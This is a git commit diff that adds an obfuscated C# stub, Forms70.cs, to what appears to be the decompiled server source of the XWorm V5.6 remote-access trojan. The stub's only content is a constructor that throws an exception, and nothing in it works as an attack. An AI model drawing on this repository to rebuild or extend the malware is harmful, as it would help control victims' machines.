2d00ccfc11aa25e806eb86bffbf95026703038ce
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:52:03 +0400

    Forms70.cs

---
+++ XWorm V5.6/Server/Forms/Forms70.cs
@@ -0,0 +1,12 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+namespace D596D81BFDD6A204A1F4EF83008D0F97
+{
+  public class X46BX73X87143B1D2X29729DD5FF3A35
+  {
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public X46BX73X87143B1D2X29729DD5FF3A35([In] string obj0) => throw new Exception("が");
+  }
+}
